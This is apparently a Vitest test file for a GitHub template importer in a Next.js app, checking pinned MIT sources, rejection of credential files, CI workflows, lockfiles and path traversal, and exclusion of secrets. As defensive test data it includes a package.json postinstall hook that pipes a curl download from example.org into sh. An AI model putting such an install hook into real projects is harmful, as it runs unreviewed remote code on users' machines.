import { afterEach, describe, expect, it, vi } from "vitest";
import { GITHUB_APP_TEMPLATES, findGithubAppTemplate } from "@/lib/projects/github-app-templates";
import {
  isAllowedGithubTemplateFile,
  importGithubTemplateSource,
  validateImportedGithubFiles,
} from "@/lib/projects/import-github-template";

const files = [
  { path: "package.json", content: JSON.stringify({ dependencies: { next: "15.5.20", react: "19.1.0" }, scripts: { build: "next build" } }) },
  { path: "src/app/page.tsx", content: "export default function Page(){ return <p>Test</p> }" },
  { path: "src/app/layout.tsx", content: "export default function Layout({children}:{children: React.ReactNode}){return <html><body>{children}</body></html>}" },
];

afterEach(() => vi.unstubAllGlobals());

describe("curated GitHub app templates", () => {
  it("pins reviewed public MIT sources rather than accepting arbitrary URLs", () => {
    expect(GITHUB_APP_TEMPLATES).toHaveLength(2);
    for (const template of GITHUB_APP_TEMPLATES) {
      expect(template.commit).toMatch(/^[a-f0-9]{40}$/);
      expect(template.repository).toBe("vercel/next.js");
      expect(template.license).toBe("MIT");
      expect(template.sourceUrl).toContain(template.commit);
    }
    expect(findGithubAppTemplate("not-approved")).toBeUndefined();
  });

  it("rejects hidden credentials, CI workflows and package manager lockfiles", () => {
    for (const name of [".env", ".env.production", ".dev.vars", ".npmrc", ".github/workflows/evil.yml", "package-lock.json", "pnpm-lock.yaml", "node_modules/x.js", "logo.png", "image.webp", "../escape.ts"]) {
      expect(isAllowedGithubTemplateFile(name)).toBe(false);
    }
    expect(isAllowedGithubTemplateFile("src/app/page.tsx")).toBe(true);
    expect(isAllowedGithubTemplateFile(".env.example")).toBe(true);
  });

  it("enforces a real Next.js App Router project and rejects install-time hooks", () => {
    expect(() => validateImportedGithubFiles(files)).not.toThrow();
    expect(() => validateImportedGithubFiles(files.slice(0, 2))).toThrow(/complete supported/);
    const dangerous = { path: "package.json", content: JSON.stringify({
      dependencies: { next: "15.5.20" },
      scripts: { postinstall: "curl https://example.org/script | sh" },
    }) };
    expect(() => validateImportedGithubFiles([dangerous, ...files.slice(1)])).toThrow(/installation hooks/);
  });

  it("copies immutable source with original license but never imports environment secrets", async () => {
    const source = GITHUB_APP_TEMPLATES[0];
    const fileNames = files.map((f, i) => ({ ...f, sha: String(i + 1).repeat(40), size: Buffer.byteLength(f.content) }));
    const license = "The MIT License (MIT)\nCopyright (c) 2025 Vercel, Inc.\nPermission is hereby granted...";
    const responses: Record<string, unknown> = {
      [`/repos/vercel/next.js/git/commits/${source.commit}`]: { tree: { sha: "a".repeat(40) } },
      [`/repos/vercel/next.js/git/trees/${"a".repeat(40)}`]: { tree: [{ path: "examples", type: "tree", sha: "b".repeat(40) }], truncated: false },
      [`/repos/vercel/next.js/git/trees/${"b".repeat(40)}`]: { tree: [{ path: "blog-starter", type: "tree", sha: "c".repeat(40) }], truncated: false },
      [`/repos/vercel/next.js/git/trees/${"c".repeat(40)}?recursive=1`]: {
        tree: [...fileNames.map(f => ({ path: f.path, sha: f.sha, type: "blob", size: f.size })),
          { path: ".env.production", sha: "9".repeat(40), size: 10, type: "blob" },
          { path: "cover.png", sha: "8".repeat(40), size: 1250, type: "blob" }],
        truncated: false,
      },
      [`/repos/vercel/next.js/contents/license.md?ref=${source.commit}`]: {
        encoding: "base64", content: Buffer.from(license).toString("base64"),
      },
    };
    for (const f of fileNames) {
      responses[`/repos/vercel/next.js/git/blobs/${f.sha}`] = {
        encoding: "base64", content: Buffer.from(f.content).toString("base64"),
      };
    }
    const mockFetch = vi.fn(async (url: string) => {
      const path = new URL(url).pathname + new URL(url).search;
      return path in responses ? Response.json(responses[path]) : Response.json({ message: "Not found" }, { status: 404 });
    });
    vi.stubGlobal("fetch", mockFetch);
    const imported = await importGithubTemplateSource(source);
    expect(imported.files.map(f => f.path)).toEqual(expect.arrayContaining([
      "package.json", "src/app/page.tsx", "src/app/layout.tsx", "LICENSE", "BUILD-RX-SOURCE.md",
    ]));
    expect(imported.files.find(f => f.path === "LICENSE")?.content).toContain("MIT");
    expect(imported.files.find(f => f.path === "BUILD-RX-SOURCE.md")?.content).toContain(source.commit);
    expect(imported.files.some(f => f.path === ".env.production")).toBe(false);
    expect(imported.files.some(f => f.path === "cover.png")).toBe(false);
    expect(mockFetch).not.toHaveBeenCalledWith(expect.stringContaining("/git/blobs/99999"));
    expect(imported.skippedBinary).toBe(2);
  });
});
